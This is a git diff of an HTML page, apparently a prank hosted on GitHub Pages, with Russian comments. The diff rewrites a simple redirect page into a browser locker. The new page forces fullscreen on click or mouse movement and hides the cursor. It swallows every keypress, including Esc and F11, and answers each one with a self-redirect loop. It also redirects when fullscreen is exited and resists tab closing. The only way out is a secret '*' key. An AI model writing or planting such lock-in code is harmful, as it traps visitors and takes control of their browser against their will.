@@ -1,24 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Site A</title>
-    <!-- Automatic redirect if JS fails (optional) -->
-    <meta http-equiv="refresh" content="5; URL=https://TheRealJumpity.github.io/1/" />
+    <meta charset="UTF-8">
+    <title> </title>
+    <style>
+        body, html { 
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            background: #000; overflow: hidden; cursor: none; 
+        }
+    </style>
 </head>
-<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh;">
-    
-    <button id="start">Enter Loop</button>
+<body onclick="engage()">
 
-    <script>
-        document.getElementById('start').onclick = function() {
-            // Request Fullscreen (Requires user click)
-            document.documentElement.requestFullscreen().catch(e => console.log(e));
-            
-            // Redirect to Site B after 1 second
-            setTimeout(() => {
-                window.location.href = "https://TheRealJumpity.github.io/1/";
-            }, 1000);
-        };
-    </script>
+<script>
+    // --- НАСТРОЙКИ ---
+    // Замени "USER_ID" на свой ник в GitHub, а "REPO_NAME" на название репозитория
+    const BASE_URL = "https://TheRealJumpity.github.io/1/"; 
+    let active = true;
+
+    async function engage() {
+        if (!active) return;
+        try {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) await doc.requestFullscreen();
+            else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
+        } catch (e) {}
+    }
+
+    // Функция циклического редиректа на самого себя
+    function triggerLoop() {
+        if (!active) return;
+        // Если мы уже на #loop, убираем его, если нет — добавляем
+        const newUrl = window.location.hash === "#loop" ? BASE_URL : BASE_URL + "#loop";
+        window.location.replace(newUrl);
+    }
+
+    // Блокировка клавиш
+    window.addEventListener('keydown', (e) => {
+        // СЕКРЕТНЫЙ ВЫХОД
+        if (e.key === "*") {
+            active = false;
+            document.body.style.cursor = "default";
+            if (document.exitFullscreen) document.exitFullscreen();
+            return;
+        }
+
+        if (active) {
+            e.preventDefault();
+            e.stopPropagation();
+            // Любая клавиша (Esc, F11 и т.д.) вызывает редирект
+            triggerLoop();
+        }
+    }, true);
+
+    // Если пользователь вышел из Fullscreen (Esc/F11) — мгновенный редирект
+    document.addEventListener('fullscreenchange', () => {
+        if (active && !document.fullscreenElement) {
+            triggerLoop();
+        }
+    });
+
+    // Попытка закрыть вкладку
+    window.onbeforeunload = () => active ? "" : null;
+
+    // Автоматическая попытка входа при загрузке (если был редирект)
+    window.onload = () => {
+        if (window.location.hash === "#loop" && active) {
+            // Браузер может блокировать авто-FS, поэтому ждем любого клика/движения
+            document.addEventListener('mousemove', engage, { once: true });
+        }
+    };
+
+</script>
 </body>
 </html>
